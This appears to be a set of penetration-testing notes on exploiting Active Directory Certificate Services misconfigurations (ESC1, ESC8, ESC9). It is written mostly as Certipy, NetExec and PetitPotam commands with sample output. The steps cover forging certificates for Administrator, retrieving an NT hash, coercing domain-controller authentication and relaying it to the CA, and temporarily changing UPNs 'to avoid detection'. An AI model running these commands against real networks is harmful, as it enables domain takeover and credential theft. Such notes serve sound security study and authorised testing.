> Part of these notes are copied from the original [Github Certipy](https://github.com/ly4k/Certipy/wiki/05-%E2%80%90-Usage) repository.

**Active Directory Certificate Services (AD CS)** exploitation targets misconfigurations in enterprise certificate infrastructures to escalate privileges or impersonate users. By abusing vulnerable certificate templates or enrollment settings, attackers can obtain certificates for high-privileged accounts and authenticate as them using PKINIT. 

## Enumeration

The first step for exploiting ad cs is using `certipy find` to discover any vulnerable configurations, execute:


```shell
certipy-ad find \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-target '10.0.0.100' -vulnerable -enabled 
```

or

```bash
nxc ldap 10.0.0.100 -u 'attacker' -p 'Passw0rd!' -M adcs
```

This will query LDAP for Certificate Templates and CA objects. The output (either to console or to a text file) will list all templates, their settings, and flag any misconfigurations. For example, part of the output might show:

```java
Certificate Authorities
 0
   CA Name                             : CORP-CA
   DNS Name                            : CA.CORP.LOCAL
   ...
   Web Enrollment
     HTTP
       Enabled                         : False
     HTTPS
       Enabled                         : True
       Channel Binding (EPA)           : False
   ...
   Permissions
     Access Rights
       ManageCa                        : CORP.LOCAL\Authenticated Users
       ManageCertificates              : CORP.LOCAL\Authenticated Users
       Read                            : CORP.LOCAL\Authenticated Users
       Enroll                          : CORP.LOCAL\Authenticated Users
   [+] User Enrollable Principals      : CORP.LOCAL\Authenticated Users
   [+] User ACL Principals             : CORP.LOCAL\Authenticated Users
   [!] Vulnerabilities
     ESC7                              : User has dangerous permissions.
     ESC8                              : Web Enrollment is enabled over HTTPS and Channel Binding is disabled.
Certificate Templates
  0
    Template Name                       : UserTemplate
    Display Name                        : UserTemplate
    Certificate Authorities             : CORP-CA
    Enabled                             : True
    Client Authentication               : True
    ...
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
    ...
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CORP.LOCAL\Domain Users
      Object Control Permissions
        Write Property Enroll           : CORP.LOCAL\Domain Users
    [+] User Enrollable Principals      : CORP.LOCAL\Domain Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

- This output shows the CA "CORP-CA" and a template "UserTemplate". The template has **Enrollee Supplies Subject** set to true, and **Client Authentication** is enabled. The permissions show that **Domain Users** can enroll for this template. The Template `[!] Vulnerabilities` section flags it as vulnerable to **ESC1**, while the CA `[!] Vulnerabilities` section shows **ESC7** and **ESC8**. Certipy's find would also list which users/groups have enrollment rights, etc.


---


## ESC1 Exploitation: Subject Alternative Name (SAN) Abuse

A Certificate Template has the **`EnrolleeSuppliesSubject`** flag set, allowing any enrolling user to specify the **UPN** or **SID** of another user, leading to impersonation.

#### Exploitation Process
**1. Certificate Request and Impersonation (`req`)**

The low-privileged user requests a certificate using the vulnerable template, providing the UPN and SID of the high-privilege target (e.g., `Administrator`) in the request.

```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'UserTemplate' \
-upn 'Administrator@corp.local' -sid 'S-1-5-21-...-500'
```


Here, `-ca 'CORP-CA'` specifies the CA name, and `-target 'CA.CORP.LOCAL'` the CA DNS name. We supply a _UPN_ of the target (Administrator) and the SID of the target. In an ESC1 scenario, this tricks the CA into issuing a certificate for Administrator to the low-priv user. If successful, Certipy will save the certificate and private key to a .pfx file:

```bash
[*] Requesting certificate via RPC
[*] Request ID is 1
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-...-500'
[*] Wrote certificate and private key to 'administrator.pfx'
```

- The `SID` value can be extracted from the User's node in Bloodhound.

**2. Authenticate as Administrator**

- Now, the `administrator.pfx` can be used with `certipy auth` to access ad admin:
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

Certipy will load the PFX, perform PKINIT to get a Kerberos TGT for Administrator, and even attempt to retrieve the NTLM hash:

```bash
[*] Certificate identities:
    SAN UPN: 'Administrator@corp.local'
    Security Extension SID: 'S-1-5-21-...-500'
[*] Using principal: 'Administrator@corp.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Wrote credential cache to 'Administrator.ccache'
[*] Trying to retrieve NT hash for 'Administrator'
[*] Got hash for 'Administrator@corp.local':
    aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
```


---

## ESC8 Exploitation: Web Enrollment + PetitPotam Relay

The Certificate Authority (CA) has **Web Enrollment enabled over HTTPS**, but **Channel Binding (EPA)** is disabled. This allows NTLM relay attacks via HTTP endpoints, such as using **PetitPotam** to coerce authentication and relay it to the CA's Web Enrollment service.

#### Exploitation Process
**1. Triggering NTLM Authentication via PetitPotam**

PetitPotam abuses MS-EFSRPC to force a machine (typically a Domain Controller) to authenticate to an attacker-controlled endpoint. This coerced NTLM authentication can then be relayed to the CA's Web Enrollment service.

```bash
python PetitPotam.py 10.0.0.101 10.0.0.100
```

- `10.0.0.101`: Target machine to coerce (e.g., Domain Controller)
- `10.0.0.100`: Attacker-controlled machine (where the relay will occur)

**2. Relaying to the CA's Web Enrollment Service**

Once the NTLM authentication is coerced, it can be relayed to the CA using Certipy's relay module. The goal is to request a certificate for a high-privileged identity (e.g., Domain Controller) using a vulnerable template.

```bash
certipy-ad relay -target <dns_name> -template "DomainController"
```

- `-target scert.ca.cat`: DNS name of the CA
- `-template "DomainController"`: Vulnerable certificate template that allows enrollment by Domain Controllers

If successful, Certipy will issue a certificate and save it as a `.pfx` file (e.g., `dc01.pfx`).

**3. Authenticating with the Relayed Certificate**

Once the `.pfx` file is obtained, it can be used to authenticate as the relayed identity (e.g., Domain Controller) using Certipy:

```bash
certipy-ad auth -pfx dc01.pfx
```

Or with additional options to interact with LDAP:

```bash
certipy-ad auth -pfx dc01.pfx -dc-ip 10.0.0.100 -ldap-shell
```


---

## ESC9 Exploitation: No Security Extension on Certificate Template

## Vulnerability Description

ESC9 occurs when a certificate template is configured with the **NoSecurityExtension** flag enabled. This means that certificates issued from this template **do not include the object SID** in the security extension.

When authenticating with Kerberos PKINIT, if the SID is missing, the KDC falls back to **mapping the certificate only by UPN**.  
If an attacker can **manipulate a userâ€™s UPN**, they can request a certificate that impersonates another user (e.g., Administrator), even though the certificate was issued to a different account.

#### Exploitation Process
**1.Change the UPN to the Target Identity**

Choose an account whose UPN you can modify (this is the **victim account** in ESC9 terminology).  
Temporarily set its UPN to match the target you want to impersonate (e.g., Administrator).

```bash
certipy-ad account \
  -u attacker@domain.local -p 'Password123!' \
  -dc-ip <DC_IP> \
  -user <UPN_WRITABLE_ACCOUNT> \
  -upn Administrator \
  update
```


**2.Request a Certificate Using the ESC9 Template**

Request a certificate using the vulnerable template. Because the template has **no security extension**, the issued certificate will **not contain a SID**, only the UPN.

```bash
certipy-ad req \
  -u attacker@domain.local -p 'Password123!' \
  -dc-ip <DC_IP> \
  -target <CA_DNS_NAME> \
  -ca <CA_NAME> \
  -template <ESC9_TEMPLATE>
```

**4.Restore the Original UPN (Cleanup - Optional)**

To reduce impact and avoid detection, revert the UPN to its original value.

```bash
certipy-ad account \
  -u attacker@domain.local -p 'Password123!' \
  -dc-ip <DC_IP> \
  -user <UPN_WRITABLE_ACCOUNT> \
  -upn original@domain.local \
  update
```

**5.Authenticate as the Target User**

Use the issued certificate to authenticate via PKINIT. Since the certificate has no SID, Kerberos maps the identity **only by UPN**.

```bash
certipy-ad auth \
  -dc-ip <DC_IP> \
  -pfx administrator.pfx \
  -username 'administrator' \
  -domain 'domain.local'
```
